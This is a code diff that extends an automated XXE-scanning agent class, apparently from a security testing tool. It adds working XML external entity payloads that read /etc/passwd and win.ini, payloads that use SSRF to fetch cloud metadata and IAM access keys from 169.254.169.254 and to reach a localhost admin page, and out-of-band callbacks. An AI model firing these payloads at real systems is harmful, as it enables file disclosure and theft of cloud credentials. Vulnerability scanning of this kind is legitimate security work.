@@ -61,44 +61,67 @@ class XXECapabilityAgent(BaseCapabilityAgent):
         base_url = f"https://{target_host}" if not target_host.startswith("http") else target_host
 
         endpoints_to_test = [
+            f"{base_url}/product/stock",
+            f"{base_url}/stock",
             f"{base_url}/api/v1/xml/process",
             f"{base_url}/api/xml",
             f"{base_url}/soap",
             f"{base_url}/upload"
         ]
 
+        for data in context.get_observation_data():
+            if isinstance(data, dict):
+                for ep in data.get("endpoints", []):
+                    if isinstance(ep, dict) and ep.get("url"):
+                        ep_url = ep["url"]
+                        if any(x in ep_url.lower() for x in ["stock", "product", "xml", "soap", "upload", "import", "parse", "cart", "checkout", "order"]):
+                            endpoints_to_test.append(ep_url)
+                if data.get("url"):
+                    u = data["url"]
+                    if any(x in u.lower() for x in ["stock", "product", "xml", "soap"]):
+                        endpoints_to_test.append(u)
+
         if hasattr(context, "shared_cache") and context.shared_cache:
             mapped = context.shared_cache.get("endpoint_mapping", [])
             for ep in mapped:
                 ep_url = ep if isinstance(ep, str) else ep.get("url", "")
-                if any(x in ep_url.lower() for x in ["xml", "soap", "upload", "import", "parse"]):
+                if any(x in ep_url.lower() for x in ["stock", "xml", "soap", "upload", "import", "parse"]):
                     endpoints_to_test.append(ep_url)
 
-        endpoints_to_test = list(dict.fromkeys(endpoints_to_test))[:6]
+        endpoints_to_test = list(dict.fromkeys(endpoints_to_test))[:8]
 
         oob_server = OOBCallbackServer.get_instance()
         scan_id = getattr(context, "scan_id", "xxe_scan")
 
         for endpoint in endpoints_to_test:
-            # 1. In-Band XXE
+            # 1. In-Band XXE & XXE-to-SSRF
             if capability_id in ("xxe_injection", "xml_parser_analysis"):
                 inband_payloads = [
-                    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
-                    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>'
+                    ('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', ["root:x:", "/bin/sh", "/bin/bash"]),
+                    ('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>', ["[font drivers]", "[files]", "[extensions]"]),
+                    ('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>', ["root:x:", "/bin/sh", "/bin/bash"]),
+                    ('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data">]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>', ["iam", "security-credentials", "meta-data", "ami-id", "instance-id", "public-ipv4"]),
+                    ('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>', ["AccessKeyId", "SecretAccessKey", "Token", "Code"]),
+                    ('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1/admin">]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>', ["admin panel", "administrator", "delete user", "welcome admin", "dashboard"]),
                 ]
-                for p in inband_payloads:
+                for p, markers in inband_payloads:
                     res = await self._test_payload(endpoint, p, {"Content-Type": "application/xml"})
-                    if res and ("root:x:" in res or "[font drivers]" in res or "[files]" in res):
+                    if res and any(m.lower() in res.lower() for m in markers):
+                        matched_m = [m for m in markers if m.lower() in res.lower()][0]
                         exch_dict = {"request": {"method": "POST", "url": endpoint, "headers": {"Content-Type": "application/xml"}, "body": p}, "response": {"status_code": 200, "body_snippet": res[:500]}}
+                        is_ssrf = "169.254" in p or "127.0.0.1" in p
+                        v_type = "xxe_ssrf" if is_ssrf else "xxe_injection"
+                        desc = f"In-Band XML External Entity (XXE) to SSRF verified; internal response disclosed '{matched_m}'." if is_ssrf else f"In-Band XML External Entity (XXE) injection detected; local system file content disclosed '{matched_m}'."
                         findings.append({
-                            "vulnerability_type": "xxe_injection",
+                            "vulnerability_type": v_type,
                             "target_url": endpoint,
-                            "payload": p[:80],
+                            "payload": p[:100],
                             "severity": "CRITICAL",
-                            "description": "In-Band XML External Entity (XXE) injection detected; local system files disclosed.",
+                            "description": desc,
                             "_exchange_obj": exch_dict
                         })
                         evidence["inband_xxe_success"] = True
+                        break
 
             # 2. Out-Of-Band (OOB) XXE
             if capability_id in ("oob_xxe", "xml_parser_analysis"):
@@ -109,6 +132,7 @@ class XXECapabilityAgent(BaseCapabilityAgent):
                 oob_payloads = [
                     f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{oob_url}"> %xxe;]><root>test</root>',
                     f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{dns_host}">]><root>&xxe;</root>',
+                    f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{dns_host}">]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>',
                     f'<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="{oob_url}"/></root>',
                     f'<?xml version="1.0"?><svg width="100" height="100" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="{oob_url}"/></svg>'
                 ]
